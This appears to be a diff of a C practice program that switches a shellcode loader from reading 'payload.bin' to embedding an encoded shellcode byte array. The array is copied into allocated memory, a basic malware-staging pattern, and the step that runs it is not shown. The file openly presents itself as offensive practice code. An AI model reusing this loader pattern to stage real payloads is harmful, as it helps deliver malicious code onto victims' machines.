@@ -11,20 +11,10 @@ int main() {
 
     FILE *f;
     size_t len;
-    void *my_payload_mem;
-
-    // 1. OPEN THE FILE
-    f = fopen("payload.bin", "rb");
-    if (f == NULL) {
-        perror("File open error");
-        return 1;
-    }
-
-    // 2. GET FILE SIZE
-    // Trick: Go to the end, ask position, go back to start.
-    fseek(f, 0, SEEK_END);
-    len = ftell(f);
-    rewind(f);
+    void *my_payload_mem; 
+    // canned shellcode maybe write my own
+    unsigned char shellcode[] = "\xe2\x12\x85\xc8\xc3\xc4\x85\xd9\xc2\xaa\x33\xfa\xfe\xf5\xf8\xcc\xc2\x87\xc9\xfe\xf4\xf8\x42\xbb\xaa\xaa\xaa\xcf\xc9\xc2\xc5\x8a\xc2\xcf\xc6\xc6\xc5\x8a\xde\xc2\xcf\xd8\xcf\xaa\xfc\xfd\xfe\xf4\xc0\x91\xf2\xa5\xaf";
+    len = sizeof(shellcode);
 
     printf("Payload size found: %ld bytes\n", len);
 
@@ -39,13 +29,8 @@ int main() {
 
     printf("Memory allocated at: %p\n", my_payload_mem);
 
-    // canned shellcode maybe write my own
-    // unsigned char shellcode[] = "\xe2\x12\x85\xc8\xc3\xc4\x85\xd9\xc2\xaa\x33\xfa\xfe\xf5\xf8\xcc\xc2\x87\xc9\xfe\xf4\xf8\x42\xbb\xaa\xaa\xaa\xcf\xc9\xc2\xc5\x8a\xc2\xcf\xc6\xc6\xc5\x8a\xde\xc2\xcf\xd8\xcf\xaa\xfc\xfd\xfe\xf4\xc0\x91\xf2\xa5\xaf";
-
     // copy the shellcode to the allocated memory
-    // my_payload_dest = memcpy(my_payload_mem, shellcode, sizeof(shellcode));
-
-    fread(my_payload_mem, 1, len, f);
+    my_payload_dest = memcpy(my_payload_mem, shellcode, sizeof(shellcode));
 
     printf("Shellcode copied succesfully to the allocated memory with memory destination at: %p\n", my_payload_dest);
 
